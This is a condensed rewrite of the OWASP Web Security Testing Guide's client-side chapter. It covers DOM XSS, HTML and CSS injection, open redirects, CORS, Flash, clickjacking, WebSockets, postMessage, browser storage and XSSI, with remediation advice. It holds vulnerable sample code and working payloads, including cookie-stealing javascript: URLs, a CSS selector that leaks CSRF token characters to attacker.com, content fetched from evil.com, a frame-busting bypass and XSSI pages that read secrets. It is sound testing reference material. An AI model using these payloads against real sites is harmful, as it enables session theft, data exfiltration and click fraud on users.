# WSTG CLNT — Client-side

OWASP WSTG v4.2. Tests WSTG-CLNT-01 → 13.

## Table of Contents

- [CLNT-01 DOM-Based XSS](#wstg-clnt-01)
- [CLNT-02 JavaScript Execution](#wstg-clnt-02)
- [CLNT-03 HTML Injection](#wstg-clnt-03)
- [CLNT-04 Client-side URL Redirect](#wstg-clnt-04)
- [CLNT-05 CSS Injection](#wstg-clnt-05)
- [CLNT-06 Client-side Resource Manipulation](#wstg-clnt-06)
- [CLNT-07 Cross Origin Resource Sharing](#wstg-clnt-07)
- [CLNT-08 Cross Site Flashing](#wstg-clnt-08)
- [CLNT-09 Clickjacking](#wstg-clnt-09)
- [CLNT-10 WebSockets](#wstg-clnt-10)
- [CLNT-11 Web Messaging](#wstg-clnt-11)
- [CLNT-12 Browser Storage](#wstg-clnt-12)
- [CLNT-13 Cross Site Script Inclusion](#wstg-clnt-13)

---

## WSTG-CLNT-01

**Testing for DOM-Based Cross Site Scripting**

Goal: find JavaScript that reads attacker-influenced data from a source (`window.location`, `document.referrer`, `document.URL`, `location.hash`, etc.) and writes it into a sink (`document.write`, `innerHTML`, `eval`, etc.) without sanitization — all executed client-side, so the server never sees the payload.

Unlike reflected/stored XSS, the malicious data never has to round-trip through the server: everything after a `#` fragment, for instance, is never even sent in the request. This makes server-side filtering and most automated scanners blind to it — they check the response body, not runtime DOM state.

```html
<script>
document.write("Site is at: " + document.location.href + ".");
</script>
```
Appending `#<script>alert('xss')</script>` to the URL executes immediately in the browser; the fragment is never transmitted to the server. Exploitability differs by source: server-inserted values depend on server-side filtering, while raw browser objects (`window.location`, etc.) depend on the browser's own encoding.

A case scanners typically miss (payload never reflected, only conditionally executed):
```html
<script>
var navAgt = navigator.userAgent;
if (navAgt.indexOf("MSIE")!=-1) {
  document.write("You are using IE as a browser and visiting site: " + document.location.href + ".");
}
</script>
```

Black-box: crawl the app and enumerate every JavaScript source/sink pair, including code outside `<script>` blocks (event handlers, CSS `expression()`, off-site includes). Manual review is required — automated tools only catch cases where the payload is reflected back in the server response.

Remediation: see the DOM-based XSS Prevention Cheat Sheet.

Refs: DomXSSWiki; DOM XSS article by Amit Klein.

---

## WSTG-CLNT-02

**Testing for JavaScript Execution**

Goal: find an injection point where attacker-controlled input reaches a JavaScript execution sink (`eval`, `window.location` assignment with a `javascript:` scheme, etc.), letting the attacker run arbitrary script in the victim's browser.

```js
var rr = location.search.substring(1);
if(rr) {
  window.location=decodeURIComponent(rr);
}
```
Exploitable via `www.victim.com/?javascript:alert(1)` — no encoding is applied before the value reaches `window.location`.

```html
<script>
function loadObj(){
  var cc=eval('('+aMess+')');
  document.getElementById('mess').textContent=cc.message;
}
if(window.location.hash.indexOf('message')==-1) {
  var aMess='({"message":"Hello User!"})';
} else {
  var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8)
}
</script>
```
Here `location.hash` (source) reaches `eval()` (sink) — an attacker controls the `message` value directly.

---

## WSTG-CLNT-03

**Testing for HTML Injection**

Goal: find input that reaches an HTML-rendering sink (`innerHTML`, `document.write()`) unsanitized, letting an attacker inject arbitrary markup that the browser trusts as part of the page.

```js
var userposition=location.href.indexOf("user=");
var user=location.href.substring(userposition+5);
document.getElementById("Welcome").innerHTML=" Hello, "+user;
```
```js
document.write("<h1>Hello, " + user +"</h1>");
```
Both exploitable with:
```
http://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>
```

Another example (jQuery, unescaped hash-driven selector/content):
```html
<script src="../js/jquery-1.7.1.js"></script>
<script>
function setMessage(){
  var t=location.hash.slice(1);
  $("div[id="+t+"]").text("the-dom-is-now-loaded-and-can-be-manipulated");
}
$(document).ready(setMessage);
$(window).bind("hashchange",setMessage)
</script>
```

---

## WSTG-CLNT-04

**Testing for Client-side URL Redirect**

Goal: find client-side code that redirects the browser (`window.location`, etc.) based on unsanitized user input — usable for phishing (the redirect originates from the trusted domain) or for bypassing access controls by chaining to a privileged path.

```js
var redir = location.hash.substring(1);
if (redir) {
  window.location='http://'+decodeURIComponent(redir);
}
```
Exploit: `http://www.victim.site/?#www.malicious.site`

A slight variant is exploitable for JavaScript injection instead of just redirect ([CLNT-02](#wstg-clnt-02)):
```js
var redir = location.hash.substring(1);
if (redir) {
  window.location=decodeURIComponent(redir);
}
```
Exploit: `http://www.victim.site/?#javascript:alert(document.cookie)`

Note browsers treat certain characters differently when parsing URLs — see [CLNT-01](#wstg-clnt-01).

---

## WSTG-CLNT-05

**Testing for CSS Injection**

Goal: find a point where attacker-controlled input reaches a CSS sink (`cssText`, a `<style>` block, an inline `style` attribute), which — depending on browser — can lead to script execution or data exfiltration via CSS selectors.

```html
<a id="a1">Click me</a>
<script>
if (location.hash.slice(1)) {
  document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
}
</script>
```
Old-browser exploits:
```
www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current; (Opera 8-12)
www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)
```

Reflected variant (PHP):
```php
<style>
p { color: <?php echo $_GET['color']; ?>; text-align: center; }
</style>
```

**Data exfiltration via CSS selectors** — brute-force attribute values character by character using selectors like the following, which triggers a request to the attacker's server only when the guessed prefix matches:
```html
<style>
input[name=csrf_token][value=^a] {
  background-image: url(http://attacker.com/log?a);
}
</style>
```

jQuery variant:
```html
<a id="a1">Click me</a><b>Hi</b>
<script>
$("a").click(function(){
  $("b").attr("style","color: " + location.hash.slice(1));
});
</script>
```

Remediation: see the Securing Cascading Style Sheets Cheat Sheet.

Refs: "Got Your Nose" (Mario Heiderich); Password "cracker" via CSS and HTML5; CSS attribute reading.

---

## WSTG-CLNT-06

**Testing for Client-side Resource Manipulation**

Goal: find user-controlled input that sets the URL of a resource the page loads (script `src`, iframe `src`, XHR target, etc.) — usable to inject malicious script or content, or to redirect a CORS request to an attacker-controlled origin.

Most damaging case: controlling the URL of a CORS request whose response is then rendered:
```html
<b id="p"></b>
<script>
function createCORSRequest(method, url) {
  var xhr = new XMLHttpRequest();
  xhr.open(method, url, true);
  xhr.onreadystatechange = function () {
    if (this.status == 200 && this.readyState == 4) {
      document.getElementById('p').innerHTML = this.responseText;
    }
  };
  return xhr;
}
var xhr = createCORSRequest('GET', location.hash.slice(1));
xhr.send(null);
</script>
```
Exploit: `www.victim.com/#http://evil.com/html.html`, where `html.html` returns:
```php
<?php header('Access-Control-Allow-Origin: http://www.victim.com'); ?>
<script>alert(document.cookie);</script>
```

Sinks to check across the app (any tag/method that loads a resource by URL):

| Resource | Tag/Method | Sink attribute |
|---|---|---|
| Frame | `iframe` | `src` |
| Link | `a` | `href` |
| AJAX | `xhr.open(method, url, true)` | url param |
| CSS | `link` | `href` |
| Image | `img` | `src` |
| Object | `object` | `data` |
| Script | `script` | `src` |

Script/object sinks are the most dangerous — they let an attacker load arbitrary executable content.

---

## WSTG-CLNT-07

**Testing Cross Origin Resource Sharing**

Goal: confirm CORS is configured to only allow the specific origins that legitimately need cross-domain access, and that any code building cross-origin requests from user input validates it.

CORS lets the browser perform cross-domain requests (superseding the same-origin-only XHR L1 API) via a header-based handshake. For non-simple requests (non-GET/POST, or credentialed) the browser first sends a preflight `OPTIONS` request to check what's permitted.

| Header | Direction | Purpose |
|---|---|---|
| `Origin` | request | domain making the request; browser-set, not spoofable from JS — but still spoofable outside the browser, so don't rely on it alone for access control |
| `Access-Control-Allow-Origin` | response | which origins may read the response; enforcement happens client-side per spec |
| `Access-Control-Request-Method` / `-Allow-Method` | preflight | method the real request will use / methods the server permits |
| `Access-Control-Request-Headers` / `-Allow-Headers` | preflight | headers the real request will use / headers the server permits |
| `Access-Control-Allow-Credentials` | response | whether the request may include user credentials |
| `Access-Control-Max-Age` | response | how long the browser may cache the preflight result |
| `Access-Control-Expose-Headers` | response | which response headers are readable by client script |

**Insecure configs to flag**: `Access-Control-Allow-Origin: *` (any domain can read the response — acceptable only for a genuinely public API); reflecting the `Origin` header back verbatim as `Access-Control-Allow-Origin` without an allowlist check (effectively equivalent to `*`, but easy to overlook).

**Input validation** — check whether URLs passed to `XMLHttpRequest` (especially absolute URLs) are validated, and whether the response is safely handled (not sunk into `innerHTML` unescaped).

Example — wildcard origin:
```
GET /test.php HTTP/1.1
Host: attacker.bar
Referer: http://example.foo/CORSexample1.html
Origin: http://example.foo

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

Example — XSS via unvalidated CORS target:
```html
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function() {
  if(req.readyState==4 && req.status==200) {
    document.getElementById("div1").innerHTML=req.responseText;
  }
}
var resource = location.hash.substring(1);
req.open("GET",resource,true);
req.send();
</script>
<div id="div1"></div>
```
`http://example.foo/main.php#profile.php` fetches a same-server file as intended. But with no origin validation, `http://example.foo/main.php#http://attacker.bar/file.php` fetches and renders attacker-controlled content — and if `attacker.bar` sets `Access-Control-Allow-Origin: *`, the injected script executes in `example.foo`'s context.

Tools: OWASP ZAP (intercept and inspect CORS headers).

---

## WSTG-CLNT-08

**Testing for Cross Site Flashing**

Goal: for legacy Flash/ActionScript content, find unsafe method calls or HTML-rendering TextFields that let an attacker-controlled FlashVar or cross-domain movie load lead to XSS, GUI spoofing, or open redirection.

Cross-Site Flashing (XSF) parallels XSS: it occurs when a movie from one domain loads/controls a movie in another (sharing its sandbox), or when JavaScript and a SWF invoke each other's methods (`GetVariable`/`SetVariable`) across trust boundaries.

**Open redirectors**: a SWF that takes a navigation target as a FlashVar can be abused as a phishing redirector, since the trusted domain's URL is what the victim sees:
```
http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofingwebsite.org/phishEndUsers.html
```
```actionscript
getURL(_root.getURLValue,"_self");
```
Developers should only accept relative URLs, or verify the target domain/protocol before navigating.

**Flash Player version matters** — later releases progressively restricted these vectors:

| Player version | `asfunction` | `ExternalInterface` | `GetURL` | HTML Injection |
|---|---|---|---|---|
| v9.0 r47/48 | Yes | Yes | Yes | Yes |
| v9.0 r115 | No | Yes | Yes | Yes |
| v9.0 r124 | No | Yes | Yes | Partially |

**Decompilation**: SWF is interpreted, so it can be decompiled for white-box review — `flare hello.swf` produces `hello.flr` (ActionScript 2.0).

**FlashVars**: developer-intended inputs, passed via `<object>`/`<embed>` params or a query string (`file.swf?var1=val1`). In AS3 they must be explicitly read from `LoaderInfo(...).parameters`; in AS2, any undefined global (`_root.x`, `_global.x`, `_level0.x`) is implicitly overwritable by a URL param of the same name — a common source of injectable state, e.g. `_root.language` feeding an XML loader URL: `file.swf?language=http://evil.example.org/malicious.xml?`.

Once a FlashVar/undefined global reaches one of these sinks, it's exploitable:

| Sink | Vector |
|---|---|
| `loadVariables()`, `loadMovie()`, `loadMovieNum()`, `FScrollPane.loadScrollContent()`, `LoadVars.load`/`.send`, `XML.load()`, `Sound.loadSound()`, `NetStream.play()`, `htmlText` | unsafe method reachable since Player r47 — grep decompiled code for these |
| `getURL()` (AS2) / `NavigateToURL` (AS3) | JS execution via `getURL(_root.URI,'_targetFrame')` ← `file.swf?URI=javascript:evilcode` |
| `asfunction:` protocol | pre-r48 could target any URL-accepting method, post-r48 restricted to HTML TextFields — `asfunction:getURL,javascript:evilcode` wherever a URL param feeds e.g. `loadMovie(_root.URL)` |
| `flash.external.ExternalInterface.call()` | abusable when part of its argument is attacker-controlled (`ExternalInterface.call(_root.callback)`) — browser-side call is effectively `eval('try { __flash__toXML('+__root.callback+') ; } catch...')` |

**HTML Injection in TextFields** — setting `tf.html = true; tf.htmlText = '<tag>text</tag>'` with attacker-controlled content allows injecting `<a>`/`<img>` tags:
```
<a href='javascript:alert(123)'>                              (direct XSS)
<a href='asfunction:function,arg'>                             (call a function)
<a href='asfunction:_root.obj.function,arg'>                   (call SWF public function)
<a href='asfunction:System.Security.allowDomain,evilhost'>     (call native static)
<img src='http://evil/evil.swf'>
<img src='javascript:evilcode//.swf'>                          (.swf suffix bypasses Flash's internal filter)
```
XSS via this vector was closed in Player 9.0.124.0, though GUI spoofing can still work.

Tools: Adobe SWF Investigator, OWASP SWFIntruder, Flare (decompiler), Flasm (disassembler), Swfmill.

---

## WSTG-CLNT-09

**Testing for Clickjacking**

Goal: confirm the target page cannot be framed by an attacker-controlled page in a way that tricks the user into clicking on a hidden/disguised element — bypassing anti-CSRF protections since the click originates from the legitimate, authenticated page.

An attacker overlays/hides the target site in a transparent iframe beneath a decoy UI; the victim believes they're clicking the decoy but the click lands on the hidden authentic page.

Black-box test: try to frame the target.
```html
<html><head><title>Clickjack test page</title></head>
<body><iframe src="http://www.target.site" width="500" height="500"></iframe></body>
</html>
```
If it loads, there's no clickjacking protection.

**Bypassing protections** (if framing is initially blocked, these techniques may still defeat it):

| Protection | Bypass |
|---|---|
| Frame-busting JS (`if(top!=self){top.location=self.location}`) | Double framing: nest the target in two frames — `parent.location` access becomes a cross-frame security violation, disabling the counter-action |
| Frame-busting JS | Disable JavaScript in the frame: IE `security="restricted"` attribute, HTML5 `sandbox` attribute (Chrome/Safari), or `document.designMode` (Firefox/IE8) |
| Frame-busting JS | `onbeforeunload` abuse: register a handler on the attacker's top page that either prompts the user to stay (defeating the bust) or auto-cancels navigation via a rapid-fire request to a `204 No Content` endpoint |
| Frame-busting JS | XSS filter abuse: inject the start of the target's own frame-busting script into a request parameter so the browser's XSS filter (IE8, Chrome 4 XSSAuditor) disables it as a "detected" attack |
| Frame-busting JS | Redefine `location` as a variable (IE7/8) or via `defineSetter` (Safari 4.0.4) so the busting code's read/navigate throws instead of executing |
| `X-Frame-Options` header | Legacy browsers (pre-2009) ignore it entirely; a stripping proxy removes it in transit; easy to miss on mobile-specific page variants |

Double-framing example:
```html
<!-- Attacker's top frame (fictitious2.html) -->
<iframe src="fictitious.html">
<!-- fictitious.html -->
<iframe src="http://example.org">
```

`onbeforeunload` bypass without user interaction:
```php
<?php header("HTTP/1.1 204 No Content"); ?>
```
```html
<script>
var prevent_bust = 0;
window.onbeforeunload = function() { prevent_bust++; };
setInterval(function() {
  if (prevent_bust > 0) {
    prevent_bust -= 2;
    window.top.location = "http://attacker.site/204.php";
  }
}, 1);
</script>
<iframe src="http://example.org">
```

**Building a PoC**: a target site's multi-step flow (e.g. bank transfer: form → confirm → execute) is often anti-CSRF-protected only on the final step. If the confirm step accepts GET params and displays a submit button, an attacker frames just that step, pre-fills `account`/`amount` via the URL, and uses CSS `opacity:0` positioning to align an invisible submit button under a decoy "Click and go!" button — the click submits the transfer confirmation while looking harmless.

Remediation: send `X-Frame-Options: DENY` (or `SAMEORIGIN`); prefer CSP `frame-ancestors` as the modern replacement, which lacks the legacy-browser and proxy-stripping caveats above. See the OWASP Clickjacking Defense Cheat Sheet.

Refs: OWASP Clickjacking; Wikipedia Clickjacking; "Next Generation Clickjacking" (Context IS, Paul Stone); "Busting Frame Busting" (Rydstedt, Bursztein, Boneh, Jackson).

---

## WSTG-CLNT-10

**Testing WebSockets**

Goal: confirm the WebSocket handshake validates `Origin`, the channel is encrypted (`wss://`) when carrying sensitive data, and standard authentication/authorization/input-validation testing has been applied to WebSocket traffic just as it would to HTTP.

WebSockets provide full-duplex client/server communication over a single TCP connection, upgraded from an initial HTTP handshake.

| Concern | Detail |
|---|---|
| Origin validation | Server must validate the handshake's `Origin` header itself — if it doesn't, any origin can connect, enabling CSRF-like cross-domain abuse |
| Confidentiality/integrity | `ws://` (port 80) is unencrypted; `wss://` (port 443, TLS) should be used for sensitive data |
| Input sanitization | WebSocket payloads are as untrusted as any other client input — sanitize/encode as usual |

Black-box:
1. Detect usage — inspect client source for `ws://`/`wss://`, use Chrome DevTools Network panel or ZAP's WebSocket tab.
2. Origin — connect with a standalone WebSocket client; if the connection succeeds, the server likely isn't checking `Origin`.
3. Confidentiality/integrity — confirm `wss://` is used for sensitive data; check the TLS config as in [CRYP-01](#wstg-cryp-01) (valid cert, no BEAST/CRIME/RC4, etc).
4. Authentication / 5. Authorization — WebSockets don't handle these themselves; run the same black-box auth(n/z) tests used elsewhere in this guide against the WS channel.
6. Input sanitization — use ZAP's WebSocket tab to replay/fuzz frames.

Gray-box: same approach, informed by API documentation of expected request/response formats.

Tools: OWASP ZAP, WebSocket Client (standalone), Chrome's Simple WebSocket Client.

Refs: HTML5 Rocks — Introducing WebSockets; W3C WebSocket API; IETF WebSocket Protocol (RFC 6455); Christian Schneider — Cross-Site WebSocket Hijacking; Jussi-Pekka Erkkilä — WebSocket Security Analysis; Robert Koch — On WebSockets in Penetration Testing; DigiNinja — OWASP ZAP and Web Sockets.

---

## WSTG-CLNT-11

**Testing Web Messaging**

Goal: confirm `postMessage()` senders always specify an exact target origin (never `*`), and receivers validate `event.origin` against an exact allowlist before trusting or acting on `event.data`.

`postMessage(message, targetOrigin)` lets same-page contexts on different origins (iframes, tabs, windows) exchange data despite the same-origin policy, superseding older, generally-insecure hacks.

Sending:
```js
iframe1.contentWindow.postMessage("Hello world","http://www.example.com");
```
Receiving:
```js
window.addEventListener("message", handler, true);
function handler(event) {
  if(event.origin === 'chat.example.com') {
    /* process message (event.data) */
  }
}
```
An origin is scheme + host + port (no path/fragment) — `https://example.com` and `http://example.com` are different origins.

**Sender-side issue**: passing `*` as `targetOrigin` means the message goes to whatever origin currently occupies that window/frame — if it's been redirected, sensitive data leaks to an untrusted host.

**Receiver-side issue #1 — substring/suffix matching instead of exact match**:
```js
function callback(e) {
  if(e.origin.indexOf(".owasp.org")!=-1) { /* process message (e.data) */ }
}
```
Intended to allow `www.owasp.org`, `chat.owasp.org`, etc., but also matches `www.owasp.org.attacker.com`.

**Receiver-side issue #2 — no origin check at all**:
```js
function callback(e) { /* process message (e.data) */ }
```

**Receiver-side issue #3 — origin checked correctly, but data still sunk unsafely**:
```js
function callback(e) {
  if(e.origin === "trusted.domain.com") {
    element.innerHTML = e.data;   // DOM XSS even though origin check passed
  }
}
```
Fix: use `element.innerText` instead of `innerHTML`, and always treat `event.data` as untrusted even from a validated origin.

Refs: OWASP HTML5 Security Cheat Sheet.

---

## WSTG-CLNT-12

**Testing Browser Storage**

Goal: confirm the application does not persist sensitive data in any client-side storage mechanism, and that code reading/writing storage isn't vulnerable to injection via unvalidated input or vulnerable libraries.

| Mechanism | Lifetime | Notes |
|---|---|---|
| `localStorage` | Persists until explicitly cleared (not in Private/Incognito) | Strings only — non-string values need `JSON.stringify` |
| `sessionStorage` | Cleared when the tab/window closes | Strings only, same as above |
| IndexedDB | Persistent, developer-managed | Can store structured objects (not just strings), e.g. `CryptoKey` objects |
| Web SQL | Deprecated since 2010 | Should not be used at all |
| Cookies | Per `Expires`/`Max-Age` | Covered separately under session management cookie-attribute testing |
| `window` global properties | Cleared on page refresh/close | Custom app state developers sometimes stash here |

List localStorage / sessionStorage entries:
```js
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(`${key}: ${localStorage.getItem(key)}`);
}
```

Dump all IndexedDB databases and object stores:
```js
const dumpIndexedDB = dbName => {
  const req = indexedDB.open(dbName, 1);
  req.onsuccess = function() {
    const db = req.result;
    Array.from(db.objectStoreNames || []).forEach(storeName => {
      const objectStore = db.transaction(storeName, 'readonly').objectStore(storeName);
      objectStore.getAll().onsuccess = event => {
        (event.target.result || []).forEach(item => console.log(`[${storeName}]`, item));
      };
    });
  };
};
indexedDB.databases().then(dbs => dbs.forEach(db => dumpIndexedDB(db.name)));
```
For CryptoKeys stored in IndexedDB, check they're set `extractable: false` when the private key material shouldn't be exposable.

List cookies visible to script:
```js
console.log(window.document.cookie);
```

List custom entries on the global `window` object (diff against a clean iframe's window):
```js
(() => {
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  const results = Object.getOwnPropertyNames(window)
    .filter(prop => !iframe.contentWindow.hasOwnProperty(prop));
  document.body.removeChild(iframe);
  results.forEach(key => console.log(`${key}: ${window[key]}`));
})();
```

Findings here often chain into other client-side attacks, e.g. DOM XSS ([CLNT-01](#wstg-clnt-01)).

Remediation: store sensitive data server-side; never rely on client-side storage as a secure store.

Refs: MDN Local Storage / Session Storage / IndexedDB; W3C Web Crypto API — Key Storage; Web SQL; OWASP Session Management Cheat Sheet.

---

## WSTG-CLNT-13

**Testing for Cross Site Script Inclusion**

Goal: find `<script>`-tag-includable endpoints that leak authenticated, sensitive data to a cross-origin page — since the same-origin policy does not restrict script *inclusion*, only most other cross-origin reads.

XSSI resembles CSRF in that it abuses an authenticated session from another origin, but instead of triggering a state change it exfiltrates data (auth tokens, session IDs, PII) by loading a victim endpoint as a script and capturing what it does to the global JS environment.

**Recon**: diff authenticated vs. unauthenticated responses for every script-like endpoint (JS, but also JSON/JSONP/CSV — XSSI isn't limited to `.js` files) to find ones that render user-specific data. Veit Hailperin's Burp plugin can help automate this comparison.

Leakage vectors:

**1. Global variables** — victim script sets a global that the attacker page reads after including it:
```js
// https://victim.com/internal/api.js (authenticated-only)
(function() { window.secret = "supersecretUserAPIkey"; })();
```
```html
<!-- attackingwebsite.com/index.html -->
<script src="https://victim.com/internal/api.js"></script>
<div id="result"></div>
<script>
document.getElementById("result").innerHTML = "Your secret data <b>" + window.secret + "</b>";
</script>
```

**2. Global function parameters** — attacker predefines the function the victim script calls:
```js
// victim.com/internal/api.js
(function() { var secret = "supersecretAPIkey"; window.globalFunction(secret); })();
```
```html
<script>
function globalFunction(param) {
  document.getElementById("result").innerHTML = "Your secret data: <b>" + param + "</b>";
}
</script>
<script src="https://victim.com/internal/api.js"></script>
```

**3. CSV with quotations theft** — injecting JavaScript-syntax strings into CSV fields the app doesn't expect to be interpreted as code, if the CSV response is later loaded as a script:
```
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
...
99,"*/}//","zzz@example.com","03-0000-0099"
```
A related historic case (Gmail, 2006): overriding the built-in `Array` constructor before including a JSON-as-JS-array response, so the attacker's constructor captures the leaked contact data:
```html
<script>function Array() { /* steal data */ }</script>
<script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
```

**4. JavaScript runtime errors** — legacy IE9/10 exposed extra detail in `window.onerror` when a non-JS response (e.g. CSV) failed to parse as script:
```html
<script>window.onerror = function(err) {alert(err)}</script>
<script src="http://victim.com/service/csvendpoint"></script>
```
Patched in modern browsers, but worth checking against legacy targets.

**5. Prototype chaining via `this`** — overriding a built-in prototype method (e.g. `Array.prototype.forEach`) so that when victim code invokes it on a sensitive array, the attacker's replacement runs with `this` bound to that array:
```js
// victim javascript.js
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];
  secret.forEach(function(element) { /* ... */ });
})();
```
```html
<script>
Array.prototype.forEach = function(callback) {
  var resultString = "Your secret values are: <b>";
  for (var i = 0, length = this.length; i < length; i++) {
    if (i > 0) resultString += ", ";
    resultString += this[i];
  }
  document.getElementById("result").innerHTML = resultString + "</b>";
};
</script>
<script src="http://victim.com/..../javascript.js"></script>
```

Refs: Takeshi Terada — Identifier based XSSI attacks; The Unexpected Dangers of Dynamic JavaScript; Sebastian Lekies — prototype-chaining demonstration.
